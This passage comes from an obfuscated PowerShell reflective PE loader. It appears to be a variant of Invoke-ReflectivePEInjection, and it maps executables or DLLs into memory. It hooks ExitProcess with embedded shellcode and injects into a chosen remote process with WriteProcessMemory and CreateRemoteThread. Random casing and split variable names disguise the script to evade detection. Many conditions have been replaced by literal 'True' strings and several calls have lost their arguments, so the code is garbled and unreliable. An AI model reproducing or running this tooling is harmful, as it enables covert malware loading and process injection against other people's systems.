    }
   }
 
 
 
 
 
 
   ${retuRNArrAy} = @()
   ${exiTFunCTions} = @()
 
 
   [IntPtr]${MSCoreEHANdle} = ${wIN32FUNCTIonS}."getmodUlehANDLe"."InVokE"('mscoree.dll')
   if 'True'
   {
    throw 'mscoree handle null'
   }
   [IntPtr]${cORExitPROCesSaddR} = ${wIN32FuNcTIoNS}."geTProcAdDReSs"."iNVOkE"' CorExitProcess'
   if 'True'
   {
    Throw 'CorExitProcess address not found'
   }
   ${EXiTfuNctiONs} += ${COREXitpROCEsSADDr}
 
 
   [IntPtr]${ExiTprOcEsSADDr} = ${WIn32fUnctioNs}."gETPROcADDrESS"."InVoKE"' ExitProcess'
   if 'True'
   {
    Throw 'ExitProcess address not found'
   }
   ${exITFUNcTIONs} += ${ExitpRoCeSSadDR}
 
   [UInt32]${OLDproTeCTfLAG} = 0
   foreach (${PROCExItfUNctioNADDR} in ${eXITfUNcTIoNS})
   {
    ${PrOcEXiTfunCtioNAddrTMp} = ${PRocEXITfunCTIoNaDDR}
 
 
    [Byte[]]${shElLcoDe1} = @(0xbb)
    [Byte[]]${shEllCOdE2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
 
    if (${pTRSIzE} -eq 8)
    {
     [Byte[]]${shEllCOdE1} = @(0x48, 0xbb)
     [Byte[]]${ShELLCode2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
    }
    [Byte[]]${ShelLCodE3} = @(0xff, 0xd3)
    ${TotALSIZE} = ${sHElLCODE1}."lENGTH" + ${PTRsiZe} + ${shellCOde2}."lengTh" + ${pTRSizE} + ${shElLCoDE3}."leNGTh"
 
    [IntPtr]${ExittHrEadaddr} = ${WiN32FUnCTiONs}."gETPROCADDrEsS"."invOke"(${KERnEl32hANdle}, 'ExitThread')
    if 'True'
    {
     Throw 'ExitThread address not found'
    }
 
    ${succeSS} = ${wIN32fUNCtioNS}."vIrtuALpROTEct"."iNVOKe"(${PRoCExITfunctiONAddR}, [UInt32]${totAlsIZe}, [UInt32]${WIN32coNsTaNts}."pagE_eXEcUTE_REadWRITe", [Ref]${OlDpRoTectflAG})
    if (${sUCcESS} -eq ${FAlSe})
    {
     Throw 'Call to VirtualProtect failed'
    }
 
 
    ${EXiTPRoCesSoRigByteSptR} =   $mlhit::'AllocHGlobal'.Invoke(${tOtALsize})
    ${win32FUnctiONS}."MEmcPy"."iNVOkE"'  0' | &'Out-Null'
    ${rEtURNArray} += ,'  '
 
 
 
    &'Write-BytesToMemory' -Bytes ${SHElLcode1} -MemoryAddress ${prOCexITFUNcTIonADDrtMP}
    ${ProCExItFUnCTionaDdrtMP} = &'Add-SignedIntAsUnsigned' ${PRoCExItfUNctIOnAddRTmP} (${ShELLCoDE1}."LeNgTh")
     (&'GeT-varIABlE' 'mLhIt' -vAlUEO)::'StructureToPtr'.Invoke'  False'
    ${PROCEXItFUNCtIOnAddRTMp} = &'Add-SignedIntAsUnsigned' ${pROCeXitFUNctIONAddRTMp} ${PTrSIZe}
    &'Write-BytesToMemory' -Bytes ${sHeLLCOdE2} -MemoryAddress ${ProcexiTfUNctiOnADDRTmP}
    ${PRoCeXiTFuncTionaDDRtmP} = &'Add-SignedIntAsUnsigned' ${pROcExItFunctioNAddRTmP} (${SheLLCOde2}."LeNgTH")
      (&('LS')  ('vaR'+'iAblE:mlH'+'It')).valUE::'StructureToPtr'.Invoke'  False'
    ${pROCexITFUncTionADDRtmP} = &'Add-SignedIntAsUnsigned' ${pRoCexITFUnctiONAddRTmP} ${PtRSIze}
    &'Write-BytesToMemory' -Bytes ${ShEllcode3} -MemoryAddress ${PROCexItFuNCTIoNaddrTMp}
 
    ${Win32FUNCtionS}."vIRTuaLPRoTECt"."iNVOkE"(${pRoCExitfuNCtiONaDDr}, [UInt32]${totalSIZE}, [UInt32]${OLdpRoTectflAg}, [Ref]${OLDpROtEctflag}) | &'Out-Null'
   }
 
 
   &'Write-Output' ${REtuRnARRAy}
  }
 
 
 
 
  Function cOpY-ARRaYOFMEMAdDrESses
  {
   Param(
   [Parameter(PoSItioN = 0, MANdaToRY = ${tRUE})]
   [Array[]]
   ${copYinFo},
 
   [Parameter(PoSItION = 1, MANdATOry = ${TRUE})]
   [System.Object]
   ${Win32FUncTIoNs},
 
   [Parameter(POSitIOn = 2, MAndAtory = ${TRUe})]
   [System.Object]
   ${wIN32CONSTaNTs}
 )
 
   [UInt32]${OldproTECTFLaG} = 0
   foreach (${iNFO} in ${cOpyInFO})
   {
    ${SuccEsS} = ${WIN32funcTiOnS}."VIrTUALprOtECT"."INvOkE"(${INfo}[0], [UInt32]${iNfo}[2], [UInt32]${wIn32cONStaNTS}."PagE_eXECuTE_rEADWRite", [Ref]${OLDpRoTecTfLAg})
    if (${sUccess} -eq ${fALsE})
    {
     Throw 'Call to VirtualProtect failed'
    }
 
    ${WIn32FUNcTiOns}."meMCpY"."iNVOke"(${inFO}[0], ${iNfo}[1], [UInt64]${INfO}[2]) | &'Out-Null'
 
    ${WIN32FuNctiONS}."viRTUALpRoTECT"."inVoke"(${inFo}[0], [UInt32]${iNFo}[2], [UInt32]${OLDPRotecTfLAG}, [Ref]${olDpRoTecTFlAg}) | &'Out-Null'
   }
  }
 
 
 
 
 
  Function gET-MEmORyprOcaDDReSS
  {
   Param(
   [Parameter(PoSiTioN = 0, MandaTOry = ${tRUE})]
   [IntPtr]
   ${PEhanDLe},
 
   [Parameter(PoSiTIOn = 1, mANDatoRy = ${TRue})]
   [String]
   ${fuNCtIOnnAmE}
 )
 
   ${Win32typEs} = &'Get-Win32Types'
   ${WIN32cOnSTaNTs} = &'Get-Win32Constants'
   ${PEiNfo} = &'Get-PEDetailedInfo' -PEHandle ${PeHANDLe} -Win32Types ${Win32types} -Win32Constants ${Win32COnStANTS}
 
 
   if (${PeiNFO}."ImAGe_NT_heaDERS"."OPTiONAlheADER"."EXPORTTAbLe"."SIZe" -eq 0)
   {
    return  (&'VAriAblE'  T2Ngf  -vAlueOnl)::"zeRo"
   }
   ${ExPorTtABleptR} = &'Add-SignedIntAsUnsigned' (${PEHANDLe}) (${PEINfO}."iMAge_NT_hEAdERS"."OpTIONAlhEADEr"."ExPORTtaBLE"."vIrTUaLAdDResS")
   ${eXpORtTAbLE} =   (&('gi') vaRIabLE:MlHit).VALue::"pTRTostrUcTuRe"' '
 
   for (${i} = 0; ${i} -lt ${eXPoRTtAble}."nUMberOFNamES"; ${i}++)
   {
 
    ${NAmeOFFSETPTR} = &'Add-SignedIntAsUnsigned' (${peHaNdle}) (${EXpORTTABle}."AdDrESSOFNamEs" + (${I} *  $MlhiT::"SizEOF"([Type][UInt32])))
    ${nAMEPtr} = &'Add-SignedIntAsUnsigned' (${pehANDLE}) ((&'VariaBLE'  'mLHiT').VAlue::"pTrToSTRUCTURE"' System.UInt32')
    ${nAMe} =   $MLhit::'PtrToStringAnsi'.Invoke(${nAmepTR})
 
    if 'True'
    {
 
 
     ${ORDINAlpTr} = &'Add-SignedIntAsUnsigned' (${PeHAnDle}) (${ExPOrTTaBLE}."AdDrEssOfNAmEorDiNALS" + (${I} *   (&'VaRiaBle' 'mLHiT'  -VaL)::"siZEof"'System.UInt16'))
     ${fUnCINDex} =   $mLhIT::"pTrTOSTrUCTure"' System.UInt16'
     ${funCoFFSetADDr} = &'Add-SignedIntAsUnsigned' (${pehANDlE}) (${exPorTtABLE}."ADdReSSOfFunCTiONs" + (${fUNCINDEX} *   $mLHiT::"SiZeOF"([Type][UInt32])))
     ${fUNcoFFsET} =  (&'Get-CHILDiteM' variABle:MLhIT).vAluE::"PTRTosTRuCtUrE"' System.UInt32'
     return &'Add-SignedIntAsUnsigned' (${PEHandLE}) (${FUNCoffseT})
    }
   }
 
   return  $t2ngf::"ZERo"
  }
 
 
  Function inVoke-MEMorYLoAdlIbrARY
  {
   Param(
   [Parameter(pOsITion = 0, MANdaTorY = ${TRuE})]
   [Byte[]]
   ${PebyTeS},
 
   [Parameter(POSITIon = 1, mANDAToRy = ${FaLsE})]
   [String]
   ${eXEaRGS},
 
   [Parameter(positiON = 2, manDAToRy = ${fAlSe})]
   [IntPtr]
   ${ReMoTePRochANdLE},
 
         [Parameter(PosItiON = 3)]
         [Bool]
         ${FoRCeAslR} = ${fAlSE}
 )
 
   ${PTRsIze} =  (&'GeT-vAriaBle' 'MLHiT'  -VAlueONL)::"sIzeof"'System.IntPtr'
 
 
   ${wiN32CONStaNTS} = &'Get-Win32Constants'
   ${win32FUNCTIOns} = &'Get-Win32Functions'
   ${WIn32TyPes} = &'Get-Win32Types'
 
   ${REMOteLOADiNg} = ${fALse}
   if ((${remoTepROchANdle} -ne ${nUlL}) -and (${remOTePROChAnDle} -ne   $t2NGF::"zERO"))
   {
    ${REMoTelOadING} = ${tRUE}
   }
 
 
   &'Write-Verbose' 'Getting basic PE information from the file'
   ${peiNFo} = &'Get-PEBasicInfo' -PEBytes ${PeByTes} -Win32Types ${WIN32tYpeS}
   ${ORIGinaLImaGEbase} = ${PeINfO}."orIGiNALImAGEBAsE"
   ${NxCOmPaTibLe} = ${tRUE}
   if 'True'
   {
    &'Write-Warning' 'PE is not compatible with DEP, might cause issues' -WarningAction 'Continue'
    ${NxcOMPaTIBLe} = ${FalSE}
   }
 
 
 
   ${PROcEsS64BIt} = ${TRUE}
   if (${reMoTeLOADiNg} -eq ${TrUe})
   {
    ${KERnel32HAndLe} = ${WIN32fUnCTIOns}."gETMoDULEhaNDLE"."iNVoke"'kernel32.dll'
    ${rEsULt} = ${wiN32fuNCTIOnS}."GETprOCadDRESs"."invoKE"' IsWow64Process'
    if 'True'
    {
     Throw 'Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit'
    }
 
    [Bool]${WOW64prOcess} = ${FALse}
    ${sucCEss} = ${WiN32FUNcTionS}."iswow64ProCess"."iNVokE"(${remOTEProchaNdLE}, [Ref]${woW64ProcEsS})
    if (${SUCcESS} -eq ${FAlSe})
    {
     Throw 'Call to IsWow64Process failed'
    }
 
    if ((${wOW64PrOcesS} -eq ${TRuE}) -or ((${WOW64PROCeSs} -eq ${FaLSE}) -and ((&'Get-vARIABle'  MlhiT -vAl)::"SizeOF"'System.IntPtr' -eq 4)))
    {
     ${PROcEss64BIt} = ${FALSE}
    }
 
 
    ${pOWErSheLl64BIT} = ${trUe}
    if ((&('Ls')  varIAblE:MlHiT).vaLuE::"SiZeOF"'System.IntPtr' -ne 8)
    {
     ${PoWerShELl64bit} = ${FALSe}
    }
    if (${PoweRsHELL64bIT} -ne ${pROCess64BIt})
    {
     throw 'PowerShell must be same architecture (x86/x64) as PE being loaded and remote process'
    }
   }
   else
   {
    if ($MlHiT::"SIZeOf"'System.IntPtr' -ne 8)
    {
     ${pROCess64bit} = ${FALSE}
    }
   }
   if (${pRoCess64bIT} -ne ${pEiNFo}."Pe64Bit")
   {
    Throw (('PE platform doesnvBmt match the architecture of the process it is being loaded in (32/64bit)')  -replacE  'vBm',[CHAR]39)
   }
 
 
 
   &'Write-Verbose' 'Allocating memory for the PE and write its headers to memory'
 
 
   [IntPtr]${LoAdAddR} =   (&('gI')  VARIAblE:T2ngf).value::"ZERO"
         ${PesUppORTsASLr} = ([Int] ${pEiNFo}."dlLCHARACTERisTICs" -band ${WiN32CONStAntS}."ImAgE_dLlCharACTerISTics_dYNAMIC_BaSE") -eq ${wIN32conStaNTS}."ImAGE_DlLchaRaCtErIsTics_DynAmiC_bASE"
   if 'True'
   {
    &'Write-Warning' 'PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)' -WarningAction 'Continue'
    [IntPtr]${lOadADDR} = ${oRIGInALIMagebaSe}
   }
         elseif (${ForCeAslR} -and (-not ${PeSUPPoRtsASLR}))
         {
             &'Write-Verbose' 'PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.'
         }
 
         if (${fOrCeasLr} -and ${reMoTElOAding})
         {
             &'Write-Error' 'Cannot use ForceASLR when loading in to a remote process.' -ErrorAction 'Stop'
         }
         if (${reMOTELOAdING} -and (-not ${peSUPPORTsASlr}))
         {
             &'Write-Error' 'PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process' -ErrorAction 'Stop'
         }
 
   ${pEHAndlE} =  (&'GeT-VArIAbLE'  'T2nGf').vaLUe::"ZeRo"
   ${efFecTiVepEhandle} =   $t2nGf::"ZeRO"
   if (${rEMOTeLOAdinG} -eq ${TRUE})
   {
 
    ${PEHandLE} = ${WIn32FUNcTiONS}."VIRTuALAlLOc"."iNVOKe"($T2nGf::"ZERo", [UIntPtr]${pEiNfO}."sIZeOfIMAge", ${wiN32CoNsTAnTS}."MeM_cOMmit" -bor ${wiN32ConSTANts}."Mem_rESeRvE", ${WIN32coNSTANTs}."pAGE_rEADwriTE")
 
 
    ${efFectIVePEhANDlE} = ${Win32FunCtiONS}."VIRtUaLALLOCEx"."InvOKe"(${remOTepRochaNDLe}, ${LoadadDr}, [UIntPtr]${PEInFO}."sIZEOFImaGe", ${wIN32CoNstANTs}."mem_cOmmit" -bor ${WIn32CoNstAntS}."mEm_ReSErVE", ${win32conStaNTS}."Page_EXecutE_ReADWRiTe")
    if (${efFECTiVepEHaNdLE} -eq   (&'GcI'  'VaRIable:T2NGF').VAluE::"zERo")
    {
     Throw 'Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use'
    }
   }
   else
   {
    if (${nxcOmpatIBLe} -eq ${TRue})
    {
     ${PEhANDLe} = ${win32FuNcTIOns}."vIrTUalAlloC"."INvOke"(${lOAdADdr}, [UIntPtr]${pEINFO}."SiZEoFimAGe", ${WiN32cONsTANts}."MeM_cOmMiT" -bor ${wIN32cONstAnTS}."meM_rEsERVe", ${WiN32COnSTANTS}."pagE_ReADwRitE")
    }
    else
    {
     ${PeHANDlE} = ${wIN32FUNcTIoNS}."ViRTUaLAlloC"."INvOkE"(${LOadAddR}, [UIntPtr]${pEINFO}."SIZeOFImagE", ${wiN32CoNsTANts}."mem_coMMiT" -bor ${wiN32ConSTanTS}."MEm_reSeRvE", ${WIn32conStantS}."pAgE_exeCuTe_REAdWrIte")
    }
    ${EFFECtivePEhAndLe} = ${PEhaNDlE}
   }
 
   [IntPtr]${PeenDAddREss} = &'Add-SignedIntAsUnsigned' (${pEHANDlE}) ([Int64]${PEiNFO}."SIZEoFIMaGE")
   if 'True'
   {
    Throw 'VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).'
   }
    $MlhIT::'Copy'.Invoke' 0  ' | &'Out-Null'
 
 
 
   &'Write-Verbose' 'Getting detailed PE information from the headers loaded in memory'
   ${peINFO} = &'Get-PEDetailedInfo' -PEHandle ${PehANDLE} -Win32Types ${WIN32tyPES} -Win32Constants ${Win32CoNSTaNTs}
   ${peINFO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'EndAddress' -Value ${PEendAdDReSS}
   ${PeINFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'EffectivePEHandle' -Value ${eFfECtivepehANdLE}
   &'Write-Verbose' "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress) "
 
 
 
   &'Write-Verbose' 'Copy PE sections in to memory'
   &'Copy-Sections' -PEBytes ${peBytes} -PEInfo ${PEinfo} -Win32Functions ${WIn32FUNctIONs} -Win32Types ${WiN32tYPES}
 
 
 
   &'Write-Verbose' 'Update memory addresses based on where the PE was actually loaded in memory'
   &'Update-MemoryAddresses' -PEInfo ${PeINFO} -OriginalImageBase ${oRIGInAliMagEBAse} -Win32Constants ${wiN32CONStAnTs} -Win32Types ${wiN32TYPes}
 
 
 
   &'Write-Verbose' 'Import DLL's needed by the PE we are loading'
   if (${ReMoTElOADING} -eq ${TrUe})
   {
    &'Import-DllImports' -PEInfo ${pEiNFO} -Win32Functions ${WIN32fuNCTIONS} -Win32Types ${WIN32TYpes} -Win32Constants ${win32ConSTANTS} -RemoteProcHandle ${rEmoTeProCHAnDle}
   }
   else
   {
    &'Import-DllImports' -PEInfo ${pEINFO} -Win32Functions ${wiN32FuNcTIoNS} -Win32Types ${WiN32types} -Win32Constants ${WiN32ConstANTs}
   }
 
 
 
   if (${REmoTelOADING} -eq ${fAlSe})
   {
    if (${NXCOmpATIBLe} -eq ${tRue})
    {
     &'Write-Verbose' 'Update memory protection flags'
     &'Update-MemoryProtectionFlags' -PEInfo ${peINFo} -Win32Functions ${WiN32FuncTiONS} -Win32Constants ${WiN32CONSTaNts} -Win32Types ${wIN32tYpEs}
    }
    else
    {
     &'Write-Verbose' 'PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute'
    }
   }
   else
   {
    &'Write-Verbose' 'PE being loaded in to a remote process, not adjusting memory permissions'
   }
 
 
 
   if (${REMoTeloaDing} -eq ${tRUe})
   {
    [UInt32]${nUMbYTeSWRitTEN} = 0
    ${SUCCess} = ${WiN32FUNcTiONS}."WriTePROCeSsmemOrY"."inVOkE"(${RemOTEProChaNDlE}, ${EFFECtIvEpEHANDlE}, ${pEHaNDLE}, [UIntPtr](${PEinFo}."sIzeoFiMAGe"), [Ref]${NUMBYteSwrItTEn})
    if (${SucCeSS} -eq ${FalSe})
    {
     Throw 'Unable to write shellcode to remote process memory.'
    }
   }
 
 
 
   if (${PEiNFo}."fILETyPE" -ieq "DLL")
   {
    if (${rEMOteloAdiNG} -eq ${falSe})
    {
     &'Write-Verbose' 'Calling dllmain so the DLL knows it has been loaded'
     ${dLLMAINptr} = &'Add-SignedIntAsUnsigned' (${PeINfO}."PEhaNdLE") (${PeiNFO}."ImAge_Nt_hEADERs"."oPTionAlhEADer"."ADdREssoFEnTRYpOINT")
     ${dllMAINdELegaTe} = &'Get-DelegateType' @' System.IntPtr System.UInt32 System.IntPtr' 'System.Boolean'
     ${DlLMAiN} =   $MLhIt::'GetDelegateForFunctionPointer'.Invoke' '
 
     ${DllMaiN}."iNvoKE"' 1 ' | &'Out-Null'
    }
    else
    {
     ${DlLmaiNpTR} = &'Add-SignedIntAsUnsigned' (${eFFEctIvEPehaNDLE}) (${peINfo}."iMAGE_nT_hEaderS"."opTiONaLhEaDER"."ADDREssOFEntRYpoint")
 
     if (${PeiNFo}."pE64bIT" -eq ${trUE})
     {
 
      ${CALlDllmAInsc1} = @' 83 72 137 227 102 131 228 0 72 185'
      ${CalLDLLMaiNsC2} = @' 186 1 0 0 0 65 184 0 0 0 0 72 184'
      ${CalldLlMaiNSC3} = @' 255 208 72 137 220 91 195'
     }
     else
     {
 
      ${cAlLDLLMaINsc1} = @' 83 137 227 131 228 240 185'
      ${CaLLdLlMAINSc2} = @' 186 1 0 0 0 184 0 0 0 0 80 82 81 184'
      ${cALldLLMAiNsc3} = @' 255 208 137 220 91 195'
     }
     ${scLenGTH} = ${cAlLdLlMAInSc1}."leNGtH" + ${CALldLlmAinSc2}."lEnGTh" + ${CAllDllmaINSC3}."LeNgTh" + (${ptRsizE} * 2)
     ${SCPSMeM} =   $mLHIt::'AllocHGlobal'.Invoke(${ScLeNGth})
     ${scpsMemOriGinAL} = ${ScPSmEm}
 
     &'Write-BytesToMemory' -Bytes ${cAlLdLlmainSC1} -MemoryAddress ${sCpsMEm}
     ${scPSmEM} = &'Add-SignedIntAsUnsigned' ${SCpSMem} (${CalLdLlmaiNSC1}."lengTH")
      (&'GcI'  'VariablE:mlHit').ValuE::'StructureToPtr'.Invoke'  False'
     ${sCPSMeM} = &'Add-SignedIntAsUnsigned' ${sCPsmEM} (${pTRSiZE})
     &'Write-BytesToMemory' -Bytes ${cALLdlLMAiNSC2} -MemoryAddress ${scPsMem}
     ${ScPSmEM} = &'Add-SignedIntAsUnsigned' ${ScPsmem} (${CaLldLLMAiNSc2}."leNgth")
       $mLHIT::'StructureToPtr'.Invoke'  False'
     ${ScPSMEm} = &'Add-SignedIntAsUnsigned' ${SCpSmeM} (${ptRSIzE})
     &'Write-BytesToMemory' -Bytes ${cALLdllMAInsc3} -MemoryAddress ${SCPSmEM}
     ${scPSmEm} = &'Add-SignedIntAsUnsigned' ${ScPsMeM} (${cAllDllMainSC3}."lENgtH")
 
     ${RsCADdr} = ${WiN32FUnCtioNS}."ViRTUAlAlLOceX"."iNVoKe"(${remotEpRochANdLE},  (&'vARiAbLE' t2NgF).VAlue::"zeRo", [UIntPtr][UInt64]${SCLengtH}, ${wIN32ConSTAnTS}."MeM_coMMiT" -bor ${WiN32coNstANTs}."mem_REsERve", ${wIn32CONsTANTS}."pagE_EXECUte_REadwRitE")
     if 'True'
     {
      Throw 'Unable to allocate memory in the remote process for shellcode'
     }
 
     ${SuCCESS} = ${wIN32FuncTionS}."WRITepROcEssmEmoRy"."INVoKE"(${remotePRocHAnDle}, ${RsCAdDr}, ${SCpsmEmORIgINal}, [UIntPtr][UInt64]${sClENgTh}, [Ref]${NumBYTeswRITten})
     if ((${sUccESs} -eq ${fAlsE}) -or ([UInt64]${nuMBytESWRitTeN} -ne [UInt64]${SClEnGTH}))
     {
      Throw 'Unable to write shellcode to remote process memory.'
     }
 
     ${RThrEAdHAndle} = &'Create-RemoteThread' -ProcessHandle ${rEMOTEpROChAnDLe} -StartAddress ${RSCaddR} -Win32Functions ${WIN32FUncTIONS}
     ${rESUlt} = ${WIN32fUNCTIONs}."wAiTfORSiNgLEObjeCt"."INVoKe"' 20000'
     if 'True'
     {
      Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
     }
 
     ${WIn32fuNCTIONs}."VIRTUAlfrEEEX"."INVOkE"'  0 ' | &'Out-Null'
    }
   }
   elseif (${peInFo}."FilEtYPe" -ieq "EXE")
   {
 
    [IntPtr]${eXEdOnEBytEpTr} =  (&'vaRiabLE' mlHit -vAlUEonLY)::'AllocHGlobal'.Invoke'1'
     $mlHit::'WriteByte'.Invoke' 0 0'
    ${oVERWritTeNmEMInfO} = &'Update-ExeFunctions' -PEInfo ${PEINFo} -Win32Functions ${wIN32FUNCTiOns} -Win32Constants ${WiN32CONSTANts} -ExeArguments ${EXEARGS} -ExeDoneBytePtr ${EXedoNebYTepTr}
 
 
 
    [IntPtr]${exeMAInPTR} = &'Add-SignedIntAsUnsigned' (${PEinFO}."pEhANDlE") (${pEiNFO}."IMage_NT_hEAdErs"."oPTiONAlheaDer"."AddresSOfEnTRYPoiNT")
    &'Write-Verbose' "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in. "
 
    ${WiN32FUnCtIons}."cReAtetHREaD"."InVOKE"((&'gET-VArIable' 't2NGf').VaLuE::"ZERo",   (&'GET-cHiLdItEM'  'vARIabLE:T2nGF').vALue::"zerO", ${exEMAINpTR},  (&'ChILdItEm' 'vaRIablE:t2ngF').VALue::"ZEro", ([UInt32]0), [Ref]([UInt32]0)) | &'Out-Null'
 
    while'True'
    {
     [Byte]${ThREaDdoNe} =  $MlhIt::'ReadByte'.Invoke' 0'
     if (${THreadDONE} -eq 1)
     {
      &'Copy-ArrayOfMemAddresses' -CopyInfo ${OVeRwRItTEnMEmiNFO} -Win32Functions ${wIn32FUNctIoNS} -Win32Constants ${wIn32cONsTAnTS}
      &'Write-Verbose' 'EXE thread has completed.'
      break
     }
     else
     {
      &'Start-Sleep' -Seconds 1
     }
    }
   }
 
   return @'  '
  }
 
 
  Function iNvOkE-MemORYfREeliBrArY
  {
   Param(
   [Parameter(PoSiTIOn=0, mANdAtorY=${tRUe})]
   [IntPtr]
   ${pEhANDLe}
 )
 
 
   ${wIn32COnStANTs} = &'Get-Win32Constants'
   ${WiN32FuNCtIONS} = &'Get-Win32Functions'
   ${wiN32TypeS} = &'Get-Win32Types'
 
   ${PEiNFO} = &'Get-PEDetailedInfo' -PEHandle ${PEHAnDLE} -Win32Types ${WiN32TYpEs} -Win32Constants ${wIN32coNStANtS}
 
 
   if (${pEINFO}."iMAgE_NT_heaDERs"."OPTIOnaLHeaDEr"."iMpOrttABle"."SizE" -gt 0)
   {
    [IntPtr]${iMPORTdeSCRIpTorPTR} = &'Add-SignedIntAsUnsigned' ([Int64]${pEINFo}."pEHANDLe") ([Int64]${peiNFO}."iMaGe_NT_headERs"."opTIOnaLhEADer"."importTABlE"."ViRtUalAdDRess")
 
    while 'True'
    {
     ${IMpoRtDesCrIpTOr} =   (&'GET-ChilDitem'  'varIabLe:MLHit').ValuE::"pTRtostrucTURe"' '
 
 
     if (${imPoRtdESCrIPTOR}."ChArACteRisTics" -eq 0 
       -and ${IMPortdeSCRIptor}."fiRstthUNk" -eq 0 
       -and ${ImpOrtDEscRIpTOr}."fORWarDERcHain" -eq 0 
       -and ${impOrtDesCripTOr}."NAMe" -eq 0 
       -and ${iMpOrTdESCrIPTOr}."TimEdatesTaMp" -eq 0)
     {
      &'Write-Verbose' 'Done unloading the libraries needed by the PE'
      break
     }
 
     ${ImPOrtdllpATh} =   (&'GEt-itEm'  VARiaBLe:mlhIT).vaLuE::"PTRtoSTRINGANSi"((&'Add-SignedIntAsUnsigned' ([Int64]${peinFo}."PehANDLE") ([Int64]${imPoRTDEScrIPtOr}."nAMe")))
     ${impoRtDLlhaNdle} = ${wIN32FUncTiONs}."GetMoDULehaNDLE"."INvOKE"(${IMpORTDLLpaTh})
 
     if 'True'
     {
      &'Write-Warning' 'Error getting DLL handle in MemoryFreeLibrary, DLLName: . Continuing anyways' -WarningAction 'Continue'
     }
 
     ${SUCcEsS} = ${WiN32FUNctIOnS}."FrEELibRARY"."iNVOkE"(${IMpOrtdLLhanDle})
     if (${sUcceSs} -eq ${FALse})
     {
      &'Write-Warning' 'Unable to free library: . Continuing anyways.' -WarningAction 'Continue'
     }
 
     ${IMpOrTDEsCRIPTORpTr} = &'Add-SignedIntAsUnsigned' (${iMPORtDesCrIPtorPTr}) ((&'CHILDITem'  'varIable:mlhiT').vAlUe::"sizEOF"([Type]${WiN32TyPes}."imAge_iMpOrT_dESCRiPTOr"))
    }
   }
 
 
   &'Write-Verbose' 'Calling dllmain so the DLL knows it is being unloaded'
   ${DLlMAinPtR} = &'Add-SignedIntAsUnsigned' (${PeiNfO}."pEhaNDle") (${PEINfO}."IMAge_nT_hEAdErs"."OptioNAlhEAdeR"."adDreSSOFENtRyPoINt")
   ${DllMAindElEgAtE} = &'Get-DelegateType' @' System.IntPtr System.UInt32 System.IntPtr' 'System.Boolean'
   ${DllMAin} =   $MlHit::'GetDelegateForFunctionPointer'.Invoke' '
 
   ${DllMaIn}."INVOkE"' 0 ' | &'Out-Null'
 
 
   ${sUCCess} = ${Win32FUNctIONs}."virTUALFree"."INvoKE"' 0 '
   if (${SucceSS} -eq ${falSE})
   {
    &'Write-Warning' 'Unable to call VirtualFree on the PE's memory. Continuing anyways.' -WarningAction 'Continue'
   }
  }
 
 
  Function MaIN
  {
   ${wiN32funCTioNS} = &'Get-Win32Functions'
   ${WIN32TypeS} = &'Get-Win32Types'
   ${wIN32cOnSTaNts} =  &'Get-Win32Constants'
 
   ${RemOtePRoCHANdle} =  $t2NGf::"ZeRo"
 
 
   if ((${PRoCid} -ne ${null}) -and (${PRoCID} -ne 0) -and (${prOCNaME} -ne ${nULL}) -and (${PRoCNAMe} -ne ""))
   {
    Throw 'Can't supply a ProcId and ProcName, choose one or the other'
   }
   elseif (${ProcNAME} -ne ${nuLL} -and ${pROcNAme} -ne "")
   {
    ${pROCESSES} = @(&'Get-Process' -Name ${procNaMe} -ErrorAction 'SilentlyContinue')
    if 'True'
    {
     Throw 'Can't find process '
    }
    elseif (${pRoceSseS}."cOUnT" -gt 1)
    {
     ${prOCINfO} = &'Get-Process' | &'where' { ${_}."Name" -eq ${PrOCname} } | &'Select-Object' 'ProcessName', 'Id', 'SessionId'
     &'Write-Output' ${PROCINFo}
     Throw 'More than one instance of  found, please specify the process ID to inject in to.'
    }
    else
    {
     ${pRocID} = ${pRocESsEs}[0]."Id"
    }
   }
 
 
 
 
 
 
 
 
 
   if ((${prOCiD} -ne ${nUlL}) -and (${pROCId} -ne 0))
   {
    ${rEMOTepRochANDle} = ${wiN32fUNCtIoNS}."oPenPRoceSS"."INVoKe"'2035711 False '
    if 'True'
    {
     Throw 'Couldn't obtain the handle for process ID: '
    }
 
    &'Write-Verbose' 'Got the handle for the remote process to inject in to'
   }
 
 
 
   &'Write-Verbose' 'Calling Invoke-MemoryLoadLibrary'
   ${pehANDLe} =   (&'vARiABle'  'T2nGF' -VA)::"zERo"
   if 'True'
   {
    ${peloAdeDInFo} = &'Invoke-MemoryLoadLibrary' -PEBytes ${pEByTes} -ExeArgs ${eXeaRGs} -ForceASLR ${forCEaSlR}
   }
   else
   {
    ${pELoADeDiNFO} = &'Invoke-MemoryLoadLibrary' -PEBytes ${peByTEs} -ExeArgs ${EXeARgs} -RemoteProcHandle ${rEmOtepROChANdle} -ForceASLR ${fORCeAslr}
   }
   if 'True'
   {
    Throw 'Unable to load PE, handle returned is NULL'
   }
 
   ${peHaNDle} = ${pEloAdEdINFO}[0]
   ${reMOtePEHANdLe} = ${PELoADEDiNFo}[1]
 
 
 
   ${peiNFO} = &'Get-PEDetailedInfo' -PEHandle ${pEhANdle} -Win32Types ${wIn32Types} -Win32Constants ${win32coNsTaNTS}
   if ((${peinFO}."filETYpE" -ieq "DLL") -and (${reMOtEPROCHandle} -eq  $T2Ngf::"ZERo"))
   {
 
 
 
          switch (${FUNcREtUrntYpe})
          {
              'WString' {
                  &'Write-Verbose' 'Calling function with WString return type'
